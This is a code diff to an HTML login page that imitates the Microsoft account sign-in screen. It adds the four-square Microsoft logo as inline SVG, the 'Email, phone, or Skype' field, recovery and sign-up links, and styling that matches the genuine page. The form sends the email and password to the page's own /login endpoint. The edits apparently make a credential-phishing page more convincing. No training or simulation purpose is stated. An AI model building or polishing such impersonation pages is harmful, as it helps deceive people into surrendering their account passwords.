@@ -22,11 +22,12 @@
             border: 1px solid #ccc;
             box-sizing: border-box;
         }
-        .logo {
-            font-size: 18px;
-            font-weight: 600;
-            color: #1b1b1b;
-            margin-bottom: 24px;
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        .microsoft-logo {
+            width: 108px;
+            height: 24px;
         }
         h2 {
             font-size: 24px;
@@ -38,7 +39,7 @@
         input[type="email"], input[type="password"] {
             width: 100%;
             padding: 6px 0;
-            margin: 12px 0 24px 0;
+            margin: 12px 0 16px 0;
             border: none;
             border-bottom: 1px solid #666;
             font-size: 15px;
@@ -47,6 +48,19 @@
         }
         input:focus {
             border-bottom: 2px solid #0067b8;
+        }
+        .links {
+            margin-bottom: 24px;
+        }
+        .links a {
+            display: block;
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 6px;
+        }
+        .links a:hover {
+            text-decoration: underline;
         }
         button {
             background-color: #0067b8;
@@ -60,16 +74,35 @@
         button:hover {
             background-color: #005da6;
         }
+        .clearfix::after {
+            content: "";
+            clear: both;
+            display: table;
+        }
     </style>
 </head>
 <body>
     <div class="login-card">
-        <div class="logo">Microsoft</div>
+        <div class="logo-container">
+            <!-- Official Microsoft 4-Square Logo SVG -->
+            <svg class="microsoft-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
+                <rect x="13" y="0" width="11" height="11" fill="#7fba00"/>
+                <rect x="0" y="13" width="11" height="11" fill="#00a4ef"/>
+                <rect x="13" y="13" width="11" height="11" fill="#ffb900"/>
+            </svg>
+        </div>
         <h2>Sign in</h2>
         <form action="/login" method="POST">
             <input type="email" name="email" placeholder="Email, phone, or Skype" required>
             <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Sign in</button>
+            <div class="links">
+                <a href="#">No account? Create one!</a>
+                <a href="#">Can't access your account?</a>
+            </div>
+            <div class="clearfix">
+                <button type="submit">Sign in</button>
+            </div>
         </form>
     </div>
 </body>
